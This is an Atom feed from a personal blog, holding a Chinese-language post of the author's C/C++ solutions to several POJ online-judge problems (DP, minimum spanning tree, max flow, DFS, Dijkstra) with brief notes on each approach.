<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chybeta</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-06-21T11:42:49.022Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>chybeta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ACM-OJ[长期更新]</title>
    <link href="http://yoursite.com/3017/06/19/ACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
    <id>http://yoursite.com/3017/06/19/ACM-OJ-长期更新/</id>
    <published>3017-06-19T08:40:18.000Z</published>
    <updated>2017-06-21T11:42:49.022Z</updated>
    
    <content type="html"><![CDATA[<p>最近更新日期：2017-06-21<br>干脆把自己平日做的题放在一篇文章里吧。不然太分散了。<br>POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617<br>XOJ: 1004 1005 1022 1061 1062 1075 1078 1316<br><a id="more"></a></p>
<h1 id="POJ"><a href="#POJ" class="headerlink" title="POJ"></a>POJ</h1><h2 id="1163"><a href="#1163" class="headerlink" title="1163"></a>1163</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1163" target="_blank" rel="external">http://poj.org/problem?id=1163</a></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>见下面POJ-3176题分析</p>
<h3 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 355</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> way[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> triangle[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;triangle[i][j]);</div><div class="line"></div><div class="line">    way[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ( j == <span class="number">0</span> )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( j == i )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j<span class="number">-1</span>] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                way[i][j] = max(way[i<span class="number">-1</span>][j],way[i<span class="number">-1</span>][j<span class="number">-1</span>]) + triangle[i][j];</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    <span class="keyword">int</span> lastrow = n - <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res = way[lastrow][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</div><div class="line">        <span class="keyword">if</span> (way[lastrow][j] &gt; res )</div><div class="line">            res = way[lastrow][j];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1258"><a href="#1258" class="headerlink" title="1258"></a>1258</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1258" target="_blank" rel="external">http://poj.org/problem?id=1258</a></p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>最小生成树。</p>
<h3 id="提交-1"><a href="#提交-1" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 105</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> cost[MAX][MAX] ;</div><div class="line"><span class="keyword">int</span> mincost[MAX];</div><div class="line"><span class="keyword">bool</span> used[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">prim</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        mincost[i] = INF;</div><div class="line">        used[i] = <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    mincost[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( <span class="literal">true</span> )&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> u = <span class="number">0</span>; u &lt; n; u++)&#123;</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || mincost[u] &lt; mincost[v]))</div><div class="line">                v = u;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( v == <span class="number">-1</span> )</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line">        res += mincost[v];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> u = <span class="number">0</span>; u &lt; n; u++)</div><div class="line">            mincost[u] = min(mincost[u], cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> res;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n) != EOF )&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</div><div class="line">                cost[i][j] = INF;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n ; j++)</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,prim());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1273"><a href="#1273" class="headerlink" title="1273"></a>1273</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1273" target="_blank" rel="external">http://poj.org/problem?id=1273</a></p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>模板题目，直接求最大流就可以。<br>我用了vector来构造邻接表，而这题的输入时一次包含了很多个测试例子。所以每次读完后都需要对邻接表进行初始化，即进行下面的操作：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++ )</div><div class="line">	G[i].clear();</div></pre></td></tr></table></figure></p>
<p>方法是网上找的，网上说这样清空了元素，但不会回收内存。</p>
<h3 id="提交-2"><a href="#提交-2" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 205</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x7fffffff</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123;<span class="keyword">int</span> to ,cap, rev;&#125;;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX];</div><div class="line"><span class="keyword">bool</span> used[MAX];</div><div class="line"><span class="keyword">int</span> n,m;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_edge</span><span class="params">(<span class="keyword">int</span> from, <span class="keyword">int</span> to,<span class="keyword">int</span> cap)</span></span>&#123;</div><div class="line">    edge one,two;</div><div class="line">    one.to = to;</div><div class="line">    one.cap = cap;</div><div class="line">    one.rev = (<span class="keyword">int</span>)(G[to].size());</div><div class="line">    G[from].push_back(one);</div><div class="line">    two.to = from;</div><div class="line">    two.cap = <span class="number">0</span>;</div><div class="line">    two.rev = (<span class="keyword">int</span>)(G[from].size()<span class="number">-1</span>);</div><div class="line">    G[to].push_back(two);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> v, <span class="keyword">int</span> t, <span class="keyword">int</span> f)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> ( v == t)</div><div class="line">        <span class="keyword">return</span> f;</div><div class="line">    used[v] = <span class="literal">true</span>;</div><div class="line">    <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)G[v].size(); i++)&#123;</div><div class="line">        edge &amp;e = G[v][i];</div><div class="line">        <span class="keyword">if</span> ( !used[e.to] &amp;&amp; e.cap &gt; <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">int</span> d = dfs(e.to,t, f &gt; e.cap?e.cap:f);</div><div class="line">            <span class="keyword">if</span> ( d &gt; <span class="number">0</span>) &#123;</div><div class="line">                e.cap -= d;</div><div class="line">                G[e.to][e.rev].cap += d;</div><div class="line">                <span class="keyword">return</span> d;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_flow</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> flow = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;;)&#123;</div><div class="line">        <span class="built_in">memset</span>(used, <span class="number">0</span>, <span class="keyword">sizeof</span>(used));</div><div class="line">        <span class="keyword">int</span> f = dfs(s,t,INF);</div><div class="line">        <span class="keyword">if</span> (f == <span class="number">0</span>) <span class="keyword">return</span> flow;</div><div class="line">        flow += f;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m) != EOF)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++ )</div><div class="line">            G[i].clear();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">            <span class="keyword">int</span> s, t,c;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;s,&amp;t,&amp;c);</div><div class="line">            add_edge(s,t,c);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,max_flow(<span class="number">1</span>,m));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1979"><a href="#1979" class="headerlink" title="1979"></a>1979</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1979" target="_blank" rel="external">http://poj.org/problem?id=1979</a></p>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>DFS()</p>
<h3 id="提交-3"><a href="#提交-3" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> X 20</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> Y 20</span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> x,y;</div><div class="line"><span class="keyword">int</span> nx,ny;</div><div class="line"><span class="keyword">int</span> sx,sy;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="keyword">char</span> maze[X][Y];</div><div class="line"><span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    num += <span class="number">1</span>;</div><div class="line">    maze[r][s] = <span class="string">'#'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</div><div class="line">        <span class="keyword">int</span> t1 = r+dx[i];</div><div class="line">        <span class="keyword">int</span> t2 = s+dy[i];</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; <span class="number">0</span> &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == <span class="string">'.'</span>)&#123;</div><div class="line">            dfs(t1,t2);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>( x != <span class="number">0</span> &amp;&amp; y != <span class="number">0</span>)&#123;</div><div class="line">        num  = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x; i++)&#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; y; j++)&#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;maze[i][j]);</div><div class="line">                <span class="keyword">if</span> (maze[i][j] == <span class="string">'@'</span>)&#123;</div><div class="line">                    sx = i;</div><div class="line">                    sy = j;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        dfs(sx,sy);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,num);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2387"><a href="#2387" class="headerlink" title="2387"></a>2387</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2387" target="_blank" rel="external">http://poj.org/problem?id=2387</a></p>
<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>最短路径 +　队列优先　。<br>这题竟然是先读入边数再读入顶点数，Ｏrz<br>另外会有 重边， 不过如果用邻接表实现的话，可以不用管，如果邻接矩阵来实现的话，最后矩阵中存储的是从点到点的多条边的最小值。</p>
<h3 id="提交-4"><a href="#提交-4" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_V 200000</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123; <span class="keyword">int</span> to, cost, flag ;&#125;;</div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</div><div class="line"></div><div class="line"><span class="keyword">int</span> V;</div><div class="line"><span class="keyword">int</span> E;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX_V];</div><div class="line"><span class="keyword">int</span> d[MAX_V];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;E,&amp;V);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)&#123;</div><div class="line">        <span class="keyword">int</span> s, t, cost;</div><div class="line">        edge temp1,temp2;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;s, &amp;t, &amp;cost);</div><div class="line">        temp1.to = t;</div><div class="line">        temp1.cost = cost;</div><div class="line">        G[s].push_back(temp1);</div><div class="line"></div><div class="line"></div><div class="line">        temp2.to = s;</div><div class="line">        temp2.cost = cost;</div><div class="line">        G[t].push_back(temp2);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[V]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    priority_queue&lt;P, <span class="built_in">vector</span>&lt;P&gt;, greater&lt;P&gt; &gt; que;</div><div class="line"></div><div class="line">    fill(d+<span class="number">1</span>,d + V+<span class="number">1</span>, INF);</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line">    que.push(P(<span class="number">0</span>,s));</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( !que.empty())&#123;</div><div class="line">        P p = que.top();</div><div class="line">        que.pop();</div><div class="line">        <span class="keyword">int</span> v = p.second;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( d[v] &lt; p.first)</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; G[v].size(); i++)&#123;</div><div class="line">            edge e = G[v][i];</div><div class="line">            <span class="keyword">if</span> ( d[e.to] &gt; d[v] + e.cost) &#123;</div><div class="line">                d[e.to] = d[v] + e.cost;</div><div class="line">                que.push(P(d[e.to], e.to));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2388"><a href="#2388" class="headerlink" title="2388"></a>2388</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2388" target="_blank" rel="external">http://poj.org/problem?id=2388</a></p>
<h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>先排序，之后打印出中间值。水题。</p>
